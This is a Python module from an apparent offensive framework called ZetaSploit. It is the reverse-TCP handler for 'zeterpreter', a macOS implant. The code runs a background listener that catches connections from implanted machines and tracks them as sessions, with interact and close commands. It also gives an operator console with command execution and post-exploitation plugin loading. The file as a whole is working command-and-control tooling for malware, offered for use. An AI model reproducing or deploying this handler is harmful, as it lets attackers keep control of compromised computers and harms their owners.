#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import sys
import socket
import threading

from core.badges import badges
from core.helper import helper
from core.loader import loader
from core.plugin.plugin import plugin

from data.macos.reverse_tcp.zeterpreter.core.listener import listener

class ZetaSploitModule:
    def __init__(self):
        self.badges = badges()
        self.helper = helper()
        self.listener = listener()
        self.plugin = plugin()
        self.loader = loader()

        self.thread = None
        self.controller = None
        self.sessions_id = dict()
        self.is_running = False
        
        self.details = {
            'Name':        "macos/reverse_tcp/zeterpreter",
            'Authors':     ['enty8080'],
            'Description': "macOS implant written in golang and compiled for macOS.",
            'Comment':     "First macOS implant in history written in golang! Yay!",
            'HasCommands': True
        }
        
        self.options = {
            'LHOST': {
                'Description': "Local host.",
                'Value':       self.helper.getip(),
                'Required':    True
            },
            'LPORT': {
                'Description': "Local port",
                'Value':       self.helper.lport,
                'Required':    True
            },
        }

        self.commands = {
            'interact': {
                'Description': "Interact with session.",
                'Usage': "interact <session_id>",
                'ArgsCount': 1,
                'NeedsArgs': True,
                'Args': [],
                'Run': self.interact
            },
            'close': {
                'Description': "Close active session.",
                'Usage': "close <session_id>",
                'ArgsCount': 1,
                'NeedsArgs': True,
                'Args': [],
                'Run': self.close
            },
            'sessions': {
                'Description': "List all active sessions.",
                'Usage': "list",
                'ArgsCount': 0,
                'NeedsArgs': False,
                'Args': [],
                'Run': self.sessions
            }
        }

    def interact(self):
        session_id = self.commands['interact']['Args'][0]
        try:
            self.shell(self.sessions_id[int(session_id)])
        except:
            print(self.badges.E + "Invalid session!")

    def close(self):
        session_id = self.commands['close']['Args'][0]
        try:
            session = self.sessions_id[int(session_id)]
            session.close_connection()
            print(self.badges.G + "Closing session "+str(session_id)+"...")
            del self.sessions_id[int(session_id)]
        except:
            print(self.badges.E + "Invalid session!")

    def sessions(self):
        if not self.sessions_id:
            print(self.badges.E + "No active sessions!")
        else:
            for session in self.sessions_id.keys():
                print(str(session))

    def start_background_listener(self, local_host, local_port):
        self.is_running = True
        id_number = 0
        while True:
            if self.is_running:
                session = self.listener.listen(local_host, local_port)
                if session:
                    self.sessions_id[id_number] = session
                    sys.stdout.write(self.badges.S + "Session "+str(id_number)+" opened!\n")
                    sys.stdout.flush()
                    id_number += 1
            else:
                return

    def start_background_server(self, local_host, local_port):
        self.thread = threading.Thread(target=self.start_background_listener, args=(local_host, local_port))
        self.thread.setDaemon(False)
        self.thread.start()

    def stop_background_server(self):
        print(self.badges.G + "Cleaning up...")
        for session in self.sessions_id.keys():
            session = self.sessions_id[session]
            session.close_connection()
        self.is_running = False
        if self.thread:
            self.thread.join()

    def shell(self, controller):
        plugins = self.loader.load_plugins('zeterpreter', 'multi', controller)
        while True:
            try:
                command = input('\033[4mzeterpreter\033[0m> ').strip()
                commands = command.split()
                if commands == []:
                    continue
                else:
                    arguments = "".join(command.split(commands[0])).strip()
                if commands[0] == "exit":
                    break
                elif commands[0] == "clear":
                    os.system("clear")
                elif commands[0] == "help":
                    print("")
                    print("Core Commands")
                    print("=============")
                    print("")
                    print("    Command        Description")
                    print("    -------        -----------")
                    print("    back           Return to the previous menu.")
                    print("    clear          Clear terminal window.")
                    print("    details        Show specified plugin details.")
                    print("    exec           Execute system command.")
                    print("    exit           Exit Zeterpreter Framework.")
                    print("    help           Show available commands.")
                    print("    plugins        Show available plugins.")
                    print("")
                elif commands[0] == "exec":
                    if len(commands) < 2:
                        print("Usage: exec <command>")
                    else:
                        print(self.badges.I + "exec:")
                        os.system(arguments)
                        print("")
                elif commands[0] == "use":
                    if len(commands) < 2:
                        print("Usage: use <plugin>")
                    else:
                        if commands[1] in plugins.keys():
                            self.plugin.console(plugins, plugins[commands[1]], 'zeterpreter')
                        else:
                            print(self.badges.E + "Unrecognozed plugin!")
                elif commands[0] == "details":
                    if len(commands) < 2:
                        print("Usage: details <modules>")
                    else:
                        if commands[1] in plugins.keys():
                            self.plugin.show_details(plugins.details)
                        else:
                            print(self.badges.E + "Unrecognozed plugin!")
                elif commands[0] == "plugins":
                    for name in plugins.keys():
                        print(name)
                else:
                    print(self.badges.E +"Unrecognized command!")
            except (KeyboardInterrupt, EOFError):
                print("")
            except Exception as e:
                print(self.badges.E +"An error occurred: "+str(e)+"!")
            
    def run(self):
        local_host = self.options['LHOST']['Value']
        local_port = self.options['LPORT']['Value']

        print(self.badges.G + "Starting background server...")
        self.start_background_server(local_host, local_port)
        print(self.badges.S + "Background server started!")